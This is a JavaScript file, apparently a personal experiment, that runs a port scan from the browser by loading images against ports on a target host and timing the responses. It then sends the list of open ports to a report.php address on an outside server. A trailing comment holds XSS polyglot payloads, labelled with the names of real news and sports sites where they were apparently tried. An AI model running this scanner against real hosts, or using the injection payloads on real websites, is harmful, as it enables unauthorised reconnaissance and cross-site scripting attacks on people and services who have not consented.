/*
  scan.js
  Jake Schwartz
*/

// 47 commonly used / abused ports
/*
var portList = [
                1, 21, 22, 23, 25, 79, 80, 110, 113, 119, 135,
                137, 139, 143, 389, 443, 445, 555, 666, 1001,
                1002, 1024, 1025, 1026, 1027, 1028, 1029, 1030,
                1243, 1720, 1900, 2000, 2869, 5000, 6667, 6670,
                6711, 6776, 6969, 7000, 8000, 8080, 12345, 12346,
                21554, 22222, 27374, 29559, 31337, 31338
              ];
*/
var portList = [80, 443, 445, 510, 511, 520, 554, 555, 560, 587, 666, 993, 994, 5222, 6667, 7070, 8000, 8001, 8002, 8080, 31337];

var
    targets     = ['owned.jakeschwartz.com'],
    openPorts   = [],
    closedPorts = [],
    to = null,
    target_to = 351,
    log_each = false,
    log_categories = true
;

function testPort(callback, target, port, timeout) {
	var image = new Image();
	
	image.onerror = function (a, b, c) {
		if (!image) return;
		image = undefined;
		openPorts[timeout].push(port);
		callback(target, port, 'open', timeout);
	};
	
	image.onload = image.onerror;
	image.src = 'http://'+ target +':'+ port;
	
	setTimeout(function () {
	// timeout has elapsed, so we deem the port closed.
		if (!image) return;
		image = undefined;
		closedPorts[timeout].push(port);
		callback(target, port, 'closed', timeout);
	}, timeout);
}

function logReport(target, port, status, timeout) {
  if (log_each) {
    console.log('Target ['+ target +'] has port ['+ port +'] ['+ status +']. t='+ timeout);
  }
}

function scan(timeout) {
  setTimeout(function() {
	  openPorts[timeout] = [];
	  closedPorts[timeout] = [];
	  //console.log("Scan on "+ timeout);
	  for (var i = 0; i < portList.length; i++) {
		  testPort(logReport, targets[0], portList[i], timeout);
	  }
	  //for (var i = 1; i < 26; i++)
	  //	testPort(logReport, targets[0], i, timeout);
	  if (log_categories) {
	    setTimeout(function() {
    	  console.log('Open ports for t='+ timeout +':   '+ openPorts[timeout].join('  '));
      	if (timeout == target_to) {
      	  $.get('http://owned.jakeschwartz.com/report.php?m='+ openPorts[timeout].join(','), function(response) {
      	    console.log('Sent report.');
      	  });
      	}
    	}, timeout*1.5);
	  }
	}, 200+2*timeout);
}

$(function() {
  if (to)
    scan(to);
  else
	  for (var t=1; t < 600; t += 10)
	    scan(t);

	setTimeout(function() {
	  console.log("Finished scan.");
	}, 4000);
});



/*
  var i = new Image(); i.onerror = function() { console.log('error') }; i.onload = function() { console.log('l') }; i.onerrorupdate = function() { console.log('u') };
  /*

  - Web worker to thread the requests
  csscholars   /588
      ?del=*
      

CNN:
>'><SCRIPT>alert(String.fromCharCode(88,83,83,46,32,79,119,110,101,100,46))</SCRIPT>

NHL:
';//\';//";alert(String.fromCharCode(88,83,86))//\";//--></SCRIPT>">'>



';alert(String.fromCharCode(88,83,84))//\';alert(String.fromCharCode(88,83,85))//";alert(String.fromCharCode(88,83,86))//\";alert(String.fromCharCode(88,83,87))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>

*/

